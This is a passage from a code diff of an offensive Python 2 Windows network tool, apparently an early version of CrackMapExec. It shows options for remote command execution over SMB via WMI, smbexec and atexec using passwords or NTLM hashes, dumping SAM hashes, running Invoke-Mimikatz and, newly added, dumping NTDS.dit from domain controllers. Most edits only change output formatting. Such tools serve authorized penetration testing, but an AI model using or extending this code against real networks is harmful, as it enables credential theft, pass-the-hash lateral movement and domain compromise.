                 elif args.execm == 'wmi':
                     executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share, noOutput)
                     result = executer.run(host, smb)
                     if result:
-                        print '[+] {}:{} {} Executed specified command via WMI'.format(host, args.port, domain)
+                        print '[+] {}:{} {} Executed specified command via WMI'.format(host, args.port, s_name)
                         print result
 
                 elif args.execm == 'atexec':
                     atsvc_exec = TSCH_EXEC(args.user, args.passwd, args.command, domain, args.hash, noOutput)
                     atsvc_exec.play(host)
                     if atsvc_exec.output:
-                        print '[+] {}:{} {} Executed specified command via ATEXEC'.format(host, args.port, domain)
+                        print '[+] {}:{} {} Executed specified command via ATEXEC'.format(host, args.port, s_name)
                         print atsvc_exec.output
 
                     atsvc_exec.cleanup()
 
             if args.list_shares:
                 share_list = _listShares(smb)
-                print '[+] {}:{} {} Available shares:'.format(host, args.port, domain)
+                print '[+] {}:{} {} Available shares:'.format(host, args.port, s_name)
                 print '\tSHARE\t\t\tPermissions'
                 print '\t-----\t\t\t-----------'
                 for share, perm in share_list.iteritems():
@@ -1896,9 +2432,11 @@ def connect(host):
 
     except SessionError as e:
         print "[-] {}:{} {}".format(host, args.port, e)
+        if args.verbose: traceback.print_exc()
 
     except DCERPCException as e:
         print "[-] {}:{} DCERPC Error: {}".format(host, args.port, e)
+        if args.verbose: traceback.print_exc()
 
     except socket.error as e:
         return
@@ -1930,15 +2468,16 @@ if __name__ == '__main__':
     parser.add_argument("-u", metavar="USERNAME", dest='user', default=None, help="Username, if omitted null session assumed")
     parser.add_argument("-p", metavar="PASSWORD", dest='passwd', default=None, help="Password")
     parser.add_argument("-H", metavar="HASH", dest='hash', default=None, help='NTLM hash')
-    parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default WORKGROUP)")
-    parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default C$)")
-    parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default 445)")
+    parser.add_argument("-d", metavar="DOMAIN", dest='domain', default="WORKGROUP", help="Domain name (default: WORKGROUP)")
+    parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default: C$)")
+    parser.add_argument("-P", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
     parser.add_argument("-v", action='store_true', dest='verbose', help="Enable verbose output")
     parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
     rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
     rgroup.add_argument("--sam", action='store_true', dest='sam', help='Dump SAM hashes from target systems')
     rgroup.add_argument("--mimikatz", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
+    rgroup.add_argument("--ntds", choices={'vss', 'drsuapi', 'ninja'}, help='Dump the NTDS.dit from the specified DCs')
 
     egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
     egroup.add_argument("--shares", action="store_true", dest="list_shares", help="List shares")
@@ -1950,7 +2489,7 @@ if __name__ == '__main__':
     sgroup.add_argument("--spider", metavar='FOLDER', type=str, default='', help='Folder to spider (defaults to share root dir)')
     sgroup.add_argument("--pattern", type=str, default= '', help='Pattern to search for in filenames and folders')
     sgroup.add_argument("--patternfile", type=argparse.FileType('r'), help='File containing patterns to search for')
-    sgroup.add_argument("--depth", type=int, default=1, help='Spider recursion depth (default 1)')
+    sgroup.add_argument("--depth", type=int, default=1, help='Spider recursion depth (default: 1)')
 
     cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
     cgroup.add_argument('--execm', choices={"wmi", "smbexec", "atexec"}, dest="execm", default="smbexec", help="Method to execute the command (default: smbexec)")
